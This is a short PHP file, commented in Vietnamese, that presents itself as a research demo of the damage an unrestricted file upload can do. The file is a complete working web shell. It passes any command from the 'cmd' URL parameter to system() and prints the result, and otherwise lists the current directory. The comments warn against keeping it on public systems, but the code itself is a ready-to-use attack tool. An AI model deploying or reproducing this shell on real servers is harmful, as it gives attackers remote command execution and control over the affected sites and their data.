<?php
// !!! WEB SHELL DEMO (Untitled-1.php) - CHỈ DÙNG CHO MỤC ĐÍCH NGHIÊN CỨU TRONG MÔI TRƯỜNG CỤC BỘ
// File này minh họa hậu quả của unrestricted file upload: file PHP được upload và có thể chạy lệnh.
// Cảnh báo:
// - KHÔNG để file tương tự trên hệ thống production hoặc public.
// - Luôn xóa hoặc cách ly file này sau khi phân tích.
// Mô tả hành vi: nếu tham số ?cmd được cung cấp, file sẽ chạy lệnh hệ thống và in kết quả.
// (Giữ nguyên để phục vụ mục đích nghiên cứu/giải thích; KHÔNG cung cấp payload hay hướng dẫn tấn công.)

echo "<pre>";

if (isset($_GET['cmd']) && !empty($_GET['cmd'])) {
    // Demo: thực thi lệnh hệ thống từ tham số 'cmd'. Rất nguy hiểm nếu public.
    // SỬA: để vô hiệu hóa trong môi trường chung, hãy xóa file này hoặc đổi tên thành *.txt
    system($_GET['cmd']);
} else {
    // Nếu không có cmd, in thông tin cơ bản
    // Tránh in danh sách hệ thống nhạy cảm trong môi trường public.
    if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
        system('dir');
    } else {
        system('ls -la');
    }
}

echo "</pre>";
?>